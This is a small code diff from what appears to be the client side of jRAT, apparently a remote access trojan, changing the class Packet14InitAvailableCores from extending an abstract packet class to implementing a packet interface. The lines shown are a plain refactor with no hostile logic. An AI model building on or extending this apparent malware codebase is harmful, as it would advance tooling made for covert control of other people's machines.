@@ -3,7 +3,7 @@ package jrat.client.packets.outgoing;
 import jrat.client.Connection;
 
 
-public class Packet14InitAvailableCores extends AbstractOutgoingPacket {
+public class Packet14InitAvailableCores implements OutgoingPacket {
 
 	@Override
 	public void write(Connection dos) throws Exception {
